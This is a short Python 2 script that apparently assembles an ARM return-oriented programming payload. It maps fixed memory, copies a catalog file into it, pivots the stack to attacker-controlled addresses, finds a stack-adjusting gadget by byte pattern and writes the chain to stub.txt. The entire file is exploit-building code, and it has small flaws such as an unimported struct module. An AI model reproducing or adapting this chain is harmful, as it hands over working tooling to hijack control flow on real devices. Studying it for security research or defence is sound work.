#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib
import dmini
from world1 import *
import goo

catalog = open('catalog.txt').read()

if len(sys.argv) != 3:
    print >> sys.stderr, "usage: python stub.py -c cache"
    sys.exit(1)

dmini.init(sys.argv[1:])

init('R4', 'R5', 'PC')
make_avail()

PROT_READ, PROT_WRITE, PROT_EXEC = 4, 2, 1
MAP_ANON, MAP_FIXED, MAP_SHARED = 0x1000, 0x0010, 1

stack_size = 1048576

funcall('_mmap', 0x11000000 - stack_size, len(catalog) + stack_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_FIXED | MAP_SHARED, -1 % (2**32), 0, 0)

# look at all these dumb magic constants

load_r0_from(0xfefe0000 + 0x558)
add_r0_by(0xfefefefe)
load_r0_r0()

funcall('_bcopy', None, 0x11000000, len(catalog))

m = marker()
set_r0_to(m)
fancy_set_sp_to(0x11000000)

m.mark()
heapadd(fwd('R7'), fwd('PC'))
set_fwd('R7', 0xfefe0558) # whoa
make_avail()
funcall('_munmap', 0x11000000 - stack_size, stack_size)
funcall('_getppid', None)

set_r0_to(1337)
fancy_set_sp_to(0xfefe060c) # offset determined by experiment

final = finalize(0xfefd0000)

# add sp, #400; pop {r4, r5, pc}
parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd')
final = struct.pack('I', parse_callback) + final

open('stub.txt', 'w').write(final)
